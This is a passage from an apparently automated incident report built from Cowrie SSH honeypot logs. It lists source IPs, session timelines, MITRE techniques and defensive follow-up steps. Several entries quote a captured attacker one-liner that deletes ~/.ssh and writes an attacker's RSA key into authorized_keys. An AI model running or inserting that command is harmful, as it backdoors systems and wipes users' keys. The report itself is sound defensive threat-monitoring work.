| `2026-09-27 15:55:41` | `cowrie.session.connect` |
| `2026-09-27 15:55:41` | `cowrie.client.version` |
| `2026-09-27 15:55:41` | `cowrie.client.kex` |
| `2026-09-27 15:55:42` | `cowrie.login.success` |
| `2026-09-27 15:55:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0220638b48a

| Field | Detail |
|---|---|
| **Source IP** | `36.93.249[.]106` |
| **First Seen** | 2026-09-27 15:55 |
| **Last Seen** | 2026-09-27 15:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:55:43` | `cowrie.session.connect` |
| `2026-09-27 15:55:43` | `cowrie.client.version` |
| `2026-09-27 15:55:43` | `cowrie.client.kex` |
| `2026-09-27 15:55:44` | `cowrie.login.success` |
| `2026-09-27 15:55:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.93.249[.]106` to AbuseIPDB if not already reported
- [ ] Block `36.93.249[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebb2e6c4d77a

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]121` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:10` | `cowrie.session.connect` |
| `2026-09-27 15:56:10` | `cowrie.client.version` |
| `2026-09-27 15:56:12` | `cowrie.client.kex` |
| `2026-09-27 15:56:13` | `cowrie.login.success` |
| `2026-09-27 15:56:15` | `cowrie.session.params` |
| `2026-09-27 15:56:15` | `cowrie.command.input` |
| `2026-09-27 15:56:15` | `cowrie.command.failed` |
| `2026-09-27 15:56:16` | `cowrie.log.closed` |
| `2026-09-27 15:56:17` | `cowrie.session.params` |
| `2026-09-27 15:56:17` | `cowrie.command.input` |
| `2026-09-27 15:56:18` | `cowrie.session.file_download` |
| `2026-09-27 15:56:18` | `cowrie.log.closed` |
| `2026-09-27 15:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]121` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce56421537ca

| Field | Detail |
|---|---|
| **Source IP** | `35.244.32[.]167` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:15` | `cowrie.session.connect` |
| `2026-09-27 15:56:15` | `cowrie.client.version` |
| `2026-09-27 15:56:15` | `cowrie.client.kex` |
| `2026-09-27 15:56:16` | `cowrie.login.success` |
| `2026-09-27 15:56:18` | `cowrie.session.params` |
| `2026-09-27 15:56:18` | `cowrie.command.input` |
| `2026-09-27 15:56:18` | `cowrie.command.failed` |
| `2026-09-27 15:56:18` | `cowrie.log.closed` |
| `2026-09-27 15:56:19` | `cowrie.session.params` |
| `2026-09-27 15:56:19` | `cowrie.command.input` |
| `2026-09-27 15:56:19` | `cowrie.session.file_download` |
| `2026-09-27 15:56:19` | `cowrie.log.closed` |
| `2026-09-27 15:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.244.32[.]167` to AbuseIPDB if not already reported
- [ ] Block `35.244.32[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b88c6bc0146d

| Field | Detail |
|---|---|
| **Source IP** | `35.244.32[.]167` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:19` | `cowrie.session.connect` |
| `2026-09-27 15:56:19` | `cowrie.client.version` |
| `2026-09-27 15:56:20` | `cowrie.client.kex` |
| `2026-09-27 15:56:21` | `cowrie.login.success` |
| `2026-09-27 15:56:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.244.32[.]167` to AbuseIPDB if not already reported
- [ ] Block `35.244.32[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e4e54ed314c

| Field | Detail |
|---|---|
| **Source IP** | `35.244.32[.]167` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:21` | `cowrie.session.connect` |
| `2026-09-27 15:56:21` | `cowrie.client.version` |
| `2026-09-27 15:56:21` | `cowrie.client.kex` |
| `2026-09-27 15:56:22` | `cowrie.login.success` |
| `2026-09-27 15:56:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.244.32[.]167` to AbuseIPDB if not already reported
- [ ] Block `35.244.32[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a338f51d566

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]121` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:26` | `cowrie.session.connect` |
| `2026-09-27 15:56:26` | `cowrie.client.version` |
| `2026-09-27 15:56:26` | `cowrie.client.kex` |
| `2026-09-27 15:56:27` | `cowrie.login.success` |
| `2026-09-27 15:56:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]121` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]121` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6c5ae6cf0e0

| Field | Detail |
|---|---|
| **Source IP** | `45.169.200[.]254` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:41` | `cowrie.session.connect` |
| `2026-09-27 15:56:41` | `cowrie.client.version` |
| `2026-09-27 15:56:41` | `cowrie.client.kex` |
| `2026-09-27 15:56:41` | `cowrie.login.success` |
| `2026-09-27 15:56:42` | `cowrie.session.params` |
| `2026-09-27 15:56:42` | `cowrie.command.input` |
| `2026-09-27 15:56:42` | `cowrie.command.failed` |
| `2026-09-27 15:56:43` | `cowrie.log.closed` |
| `2026-09-27 15:56:43` | `cowrie.session.params` |
| `2026-09-27 15:56:43` | `cowrie.command.input` |
| `2026-09-27 15:56:43` | `cowrie.session.file_download` |
| `2026-09-27 15:56:43` | `cowrie.log.closed` |
| `2026-09-27 15:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.200[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.169.200[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9162f4a5059

| Field | Detail |
|---|---|
| **Source IP** | `45.169.200[.]254` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:44` | `cowrie.session.connect` |
| `2026-09-27 15:56:44` | `cowrie.client.version` |
| `2026-09-27 15:56:44` | `cowrie.client.kex` |
| `2026-09-27 15:56:44` | `cowrie.login.success` |
| `2026-09-27 15:56:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.200[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.169.200[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76b2e800066

| Field | Detail |
|---|---|
| **Source IP** | `45.169.200[.]254` |
| **First Seen** | 2026-09-27 15:56 |
| **Last Seen** | 2026-09-27 15:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:56:44` | `cowrie.session.connect` |
| `2026-09-27 15:56:44` | `cowrie.client.version` |
| `2026-09-27 15:56:45` | `cowrie.client.kex` |
| `2026-09-27 15:56:45` | `cowrie.login.success` |
| `2026-09-27 15:56:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.169.200[.]254` to AbuseIPDB if not already reported
- [ ] Block `45.169.200[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e65e6141844

| Field | Detail |
|---|---|
| **Source IP** | `14.103.118[.]121` |
| **First Seen** | 2026-09-27 15:57 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 15:57:59` | `cowrie.session.connect` |
| `2026-09-27 15:57:59` | `cowrie.client.version` |
| `2026-09-27 15:57:59` | `cowrie.client.kex` |
| `2026-09-27 15:58:00` | `cowrie.login.success` |
| `2026-09-27 15:58:01` | `cowrie.session.params` |
| `2026-09-27 15:58:01` | `cowrie.command.input` |
| `2026-09-27 15:58:01` | `cowrie.command.failed` |
| `2026-09-27 16:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.118[.]121` to AbuseIPDB if not already reported
- [ ] Block `14.103.118[.]121` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f03297e7ae06

| Field | Detail |
|---|---|
| **Source IP** | `217.60.97[.]61` |
| **First Seen** | 2026-09-27 16:01 |
| **Last Seen** | 2026-09-27 16:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:01:55` | `cowrie.session.connect` |
| `2026-09-27 16:01:55` | `cowrie.client.version` |
| `2026-09-27 16:01:55` | `cowrie.client.kex` |
| `2026-09-27 16:01:55` | `cowrie.login.success` |
| `2026-09-27 16:01:56` | `cowrie.session.params` |
| `2026-09-27 16:01:56` | `cowrie.command.input` |
| `2026-09-27 16:01:56` | `cowrie.command.failed` |
| `2026-09-27 16:01:56` | `cowrie.log.closed` |
| `2026-09-27 16:01:56` | `cowrie.session.params` |
| `2026-09-27 16:01:56` | `cowrie.command.input` |
| `2026-09-27 16:01:56` | `cowrie.session.file_download` |
| `2026-09-27 16:01:56` | `cowrie.log.closed` |
| `2026-09-27 16:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.97[.]61` to AbuseIPDB if not already reported
- [ ] Block `217.60.97[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb4941c317a0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.97[.]61` |
| **First Seen** | 2026-09-27 16:01 |
| **Last Seen** | 2026-09-27 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:01:56` | `cowrie.session.connect` |
| `2026-09-27 16:01:56` | `cowrie.client.version` |
| `2026-09-27 16:01:56` | `cowrie.client.kex` |
| `2026-09-27 16:01:56` | `cowrie.login.success` |
| `2026-09-27 16:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.97[.]61` to AbuseIPDB if not already reported
- [ ] Block `217.60.97[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f497675b3dfc

| Field | Detail |
|---|---|
| **Source IP** | `217.60.97[.]61` |
| **First Seen** | 2026-09-27 16:01 |
| **Last Seen** | 2026-09-27 16:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:01:56` | `cowrie.session.connect` |
| `2026-09-27 16:01:56` | `cowrie.client.version` |
| `2026-09-27 16:01:56` | `cowrie.client.kex` |
| `2026-09-27 16:01:56` | `cowrie.login.success` |
| `2026-09-27 16:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.97[.]61` to AbuseIPDB if not already reported
- [ ] Block `217.60.97[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeb7726e5177

| Field | Detail |
|---|---|
| **Source IP** | `81.23.173[.]32` |
| **First Seen** | 2026-09-27 16:03 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:03:20` | `cowrie.session.connect` |
| `2026-09-27 16:03:20` | `cowrie.client.version` |
| `2026-09-27 16:03:20` | `cowrie.client.kex` |
| `2026-09-27 16:03:20` | `cowrie.login.success` |
| `2026-09-27 16:03:21` | `cowrie.session.params` |
| `2026-09-27 16:03:21` | `cowrie.command.input` |
| `2026-09-27 16:03:21` | `cowrie.command.failed` |
| `2026-09-27 16:03:21` | `cowrie.log.closed` |
| `2026-09-27 16:03:22` | `cowrie.session.params` |
| `2026-09-27 16:03:22` | `cowrie.command.input` |
| `2026-09-27 16:03:22` | `cowrie.session.file_download` |
| `2026-09-27 16:03:22` | `cowrie.log.closed` |
| `2026-09-27 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.23.173[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.23.173[.]32` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a29dd161231

| Field | Detail |
|---|---|
| **Source IP** | `139.59.133[.]58` |
| **First Seen** | 2026-09-27 16:03 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:03:21` | `cowrie.session.connect` |
| `2026-09-27 16:03:21` | `cowrie.client.version` |
| `2026-09-27 16:03:21` | `cowrie.client.kex` |
| `2026-09-27 16:03:22` | `cowrie.login.success` |
| `2026-09-27 16:03:23` | `cowrie.session.params` |
| `2026-09-27 16:03:23` | `cowrie.command.input` |
| `2026-09-27 16:03:23` | `cowrie.command.failed` |
| `2026-09-27 16:03:23` | `cowrie.log.closed` |
| `2026-09-27 16:03:24` | `cowrie.session.params` |
| `2026-09-27 16:03:24` | `cowrie.command.input` |
| `2026-09-27 16:03:24` | `cowrie.session.file_download` |
| `2026-09-27 16:03:24` | `cowrie.log.closed` |
| `2026-09-27 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.133[.]58` to AbuseIPDB if not already reported
- [ ] Block `139.59.133[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbc4103d0414

| Field | Detail |
|---|---|
| **Source IP** | `81.23.173[.]32` |
| **First Seen** | 2026-09-27 16:03 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:03:22` | `cowrie.session.connect` |
| `2026-09-27 16:03:22` | `cowrie.client.version` |
| `2026-09-27 16:03:23` | `cowrie.client.kex` |
| `2026-09-27 16:03:24` | `cowrie.login.success` |
| `2026-09-27 16:03:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.23.173[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.23.173[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d71a433e9d1c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.133[.]58` |
| **First Seen** | 2026-09-27 16:03 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:03:24` | `cowrie.session.connect` |
| `2026-09-27 16:03:24` | `cowrie.client.version` |
| `2026-09-27 16:03:24` | `cowrie.client.kex` |
| `2026-09-27 16:03:25` | `cowrie.login.success` |
| `2026-09-27 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.133[.]58` to AbuseIPDB if not already reported
- [ ] Block `139.59.133[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8b0805f5e9a

| Field | Detail |
|---|---|
| **Source IP** | `81.23.173[.]32` |
| **First Seen** | 2026-09-27 16:03 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:03:24` | `cowrie.session.connect` |
| `2026-09-27 16:03:24` | `cowrie.client.version` |
| `2026-09-27 16:03:24` | `cowrie.client.kex` |
| `2026-09-27 16:03:25` | `cowrie.login.success` |
| `2026-09-27 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.23.173[.]32` to AbuseIPDB if not already reported
- [ ] Block `81.23.173[.]32` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1283efbf5775

| Field | Detail |
|---|---|
| **Source IP** | `139.59.133[.]58` |
| **First Seen** | 2026-09-27 16:03 |
| **Last Seen** | 2026-09-27 16:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:03:25` | `cowrie.session.connect` |
| `2026-09-27 16:03:25` | `cowrie.client.version` |
| `2026-09-27 16:03:25` | `cowrie.client.kex` |
| `2026-09-27 16:03:25` | `cowrie.login.success` |
| `2026-09-27 16:03:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.133[.]58` to AbuseIPDB if not already reported
- [ ] Block `139.59.133[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c04004c9721b

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:21` | `cowrie.session.connect` |
| `2026-09-27 16:22:21` | `cowrie.client.version` |
| `2026-09-27 16:22:21` | `cowrie.client.kex` |
| `2026-09-27 16:22:22` | `cowrie.login.success` |
| `2026-09-27 16:22:23` | `cowrie.session.params` |
| `2026-09-27 16:22:23` | `cowrie.command.input` |
| `2026-09-27 16:22:23` | `cowrie.log.closed` |
| `2026-09-27 16:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d125c6573ba

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-27 16:22 |
| **Last Seen** | 2026-09-27 16:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 16:22:26` | `cowrie.session.connect` |
| `2026-09-27 16:22:26` | `cowrie.client.version` |
| `2026-09-27 16:22:27` | `cowrie.client.kex` |
| `2026-09-27 16:22:28` | `cowrie.login.success` |
| `2026-09-27 16:22:29` | `cowrie.session.params` |
| `2026-09-27 16:22:29` | `cowrie.command.input` |
